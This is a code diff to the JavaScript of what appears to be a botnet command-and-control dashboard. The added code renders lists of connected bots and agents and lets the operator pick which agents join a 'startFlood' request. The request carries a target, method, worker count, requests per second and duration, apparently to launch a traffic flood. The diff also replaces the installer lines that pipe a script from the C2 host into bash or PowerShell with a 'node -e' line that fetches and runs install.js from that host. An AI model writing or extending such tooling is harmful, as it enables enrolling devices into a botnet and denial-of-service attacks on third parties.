@@ -142,27 +142,82 @@ function renderBots() {
     if (!tb) return;
     if (!bots.length) {
         tb.innerHTML = '<tr><td colspan="7" class="muted-cell">No devices connected — deploy agent.py to a device to get started</td></tr>';
+    } else {
+        const now = Date.now() / 1000;
+        tb.innerHTML = bots.map(b => {
+            const ago    = Math.round(now - (b.last_seen || 0));
+            const online = ago < 30;
+            const dot    = online
+                ? '<span class="dot dot-online" style="display:inline-block"></span>'
+                : '<span class="dot dot-offline" style="display:inline-block"></span>';
+            const agoStr = ago < 60 ? ago + 's ago' : ago < 3600 ? Math.floor(ago/60) + 'm ago' : 'inactive';
+            return `<tr>
+                <td>${dot}</td>
+                <td style="font-family:monospace;font-size:.8rem">${b.id}</td>
+                <td>${b.hostname || b.label || '-'}</td>
+                <td style="font-size:.78rem;color:#64748b">${b.platform || '-'}</td>
+                <td style="font-family:monospace;font-size:.8rem">${b.ip || '-'}</td>
+                <td style="color:${online ? '#16a34a' : '#94a3b8'}">${agoStr}</td>
+                <td><button class="btn-link" style="color:#ef4444" onclick="removeBot('${b.id}')">Remove</button></td>
+            </tr>`;
+        }).join('');
+    }
+    renderAgentSelector();
+}
+
+/* ── Agent selector (Dashboard) ───────────────────────────────── */
+function renderAgentSelector() {
+    const box = document.getElementById('agent-select-box');
+    const badge = document.getElementById('agent-count-badge');
+    if (!box) return;
+    if (!bots.length) {
+        box.innerHTML = '<div class="agent-select-empty">No agents connected</div>';
+        if (badge) badge.textContent = '0';
         return;
     }
     const now = Date.now() / 1000;
-    tb.innerHTML = bots.map(b => {
+    // Preserve existing checked state
+    const checked = new Set(getSelectedAgentIds());
+    box.innerHTML = bots.map(b => {
         const ago    = Math.round(now - (b.last_seen || 0));
         const online = ago < 30;
-        const dot    = online
-            ? '<span class="dot dot-online" style="display:inline-block"></span>'
-            : '<span class="dot dot-offline" style="display:inline-block"></span>';
-        const agoStr = ago < 60 ? ago + 's ago' : ago < 3600 ? Math.floor(ago/60) + 'm ago' : 'inactive';
-        return `<tr>
-            <td>${dot}</td>
-            <td style="font-family:monospace;font-size:.8rem">${b.id}</td>
-            <td>${b.hostname || b.label || '-'}</td>
-            <td style="font-size:.78rem;color:#64748b">${b.platform || '-'}</td>
-            <td style="font-family:monospace;font-size:.8rem">${b.ip || '-'}</td>
-            <td style="color:${online ? '#16a34a' : '#94a3b8'}">${agoStr}</td>
-            <td><button class="btn-link" style="color:#ef4444" onclick="removeBot('${b.id}')">Remove</button></td>
-        </tr>`;
+        const dot    = online ? '🟢' : '🔴';
+        const isChecked = checked.size === 0 || checked.has(b.id); // default all checked
+        return `<label class="agent-select-row">
+            <input type="checkbox" class="agent-cb" value="${b.id}" ${isChecked ? 'checked' : ''} onchange="updateAgentBadge()">
+            <span class="dot ${online ? 'dot-online' : 'dot-offline'}" style="display:inline-block;flex-shrink:0"></span>
+            <span style="font-family:monospace;font-size:.8rem;flex:1">${b.id}</span>
+            <span style="font-size:.75rem;color:#64748b">${b.hostname || b.ip || ''}</span>
+        </label>`;
     }).join('');
+    updateAgentBadge();
 }
+
+function updateAgentBadge() {
+    const checked = getSelectedAgentIds();
+    const badge   = document.getElementById('agent-count-badge');
+    if (badge) badge.textContent = checked.length + ' / ' + bots.length;
+}
+
+function getSelectedAgentIds() {
+    return Array.from(document.querySelectorAll('.agent-cb:checked')).map(el => el.value);
+}
+
+function selectAllAgents(val) {
+    document.querySelectorAll('.agent-cb').forEach(cb => cb.checked = val);
+    updateAgentBadge();
+}
+
+// Show/hide agent selector when toggle changes
+document.addEventListener('change', e => {
+    if (e.target.id === 'opt-bots') {
+        const field = document.getElementById('agent-selector-field');
+        if (field) {
+            field.style.display = e.target.checked ? 'flex' : 'none';
+            if (e.target.checked) renderAgentSelector();
+        }
+    }
+});
 
 async function removeBot(id) {
     await fetch('/api/bots/remove', {
@@ -177,10 +232,8 @@ async function removeBot(id) {
 function updateInstallers() {
     const host = (document.getElementById('c2-host').value.trim()) || 'YOUR_C2_IP';
     const port = (document.getElementById('c2-port').value.trim()) || '5000';
-    const sh  = document.getElementById('install-sh');
-    const ps1 = document.getElementById('install-ps1');
-    if (sh)  sh.textContent  = `curl -s "http://${host}:${port}/install.sh?host=${host}&port=${port}" | bash`;
-    if (ps1) ps1.textContent = `iwr "http://${host}:${port}/install.ps1?host=${host}&port=${port}" | iex`;
+    const jsEl = document.getElementById('install-js');
+    if (jsEl) jsEl.textContent = `node -e "$(curl -s 'http://${host}:${port}/install.js?host=${host}&port=${port}')"`;
 }
 
 function copyInstaller(type) {
@@ -342,10 +395,13 @@ async function startFlood(e) {
     addLog('Workers: ' + workers + '  RPS: ' + rps + '  Duration: ' + duration + 's', 'info');
 
     try {
+        const selectedIds = useBots ? getSelectedAgentIds() : [];
         const r = await fetch('/api/start', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ target, method, workers, rps, duration, local: useLocal, bots: useBots })
+            body: JSON.stringify({ target, method, workers, rps, duration,
+                                   local: useLocal, bots: useBots,
+                                   agent_ids: selectedIds.length ? selectedIds : null })
         });
         const d = await r.json();
         if (!d.ok) { addLog('Error: ' + d.error, 'error'); setRunning(false); return; }
